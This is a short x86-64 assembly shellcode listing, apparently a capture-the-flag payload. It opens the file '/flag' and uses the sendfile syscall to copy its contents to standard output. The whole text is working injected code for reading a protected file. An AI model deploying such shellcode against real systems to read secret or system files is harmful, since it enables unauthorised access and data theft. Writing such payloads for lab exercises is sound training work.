.intel_syntax noprefix
.global _start


_start:
mov rbx, 0x67616c662f ; /flag
push rbx
push rsp
pop rdi
push 0x2
pop rax
xor rsi, rsi
syscall

push 0x1
pop rdi
push rax
pop rsi
xor rdx, rdx
push 0x253
pop r10
push 0x28
pop rax
syscall
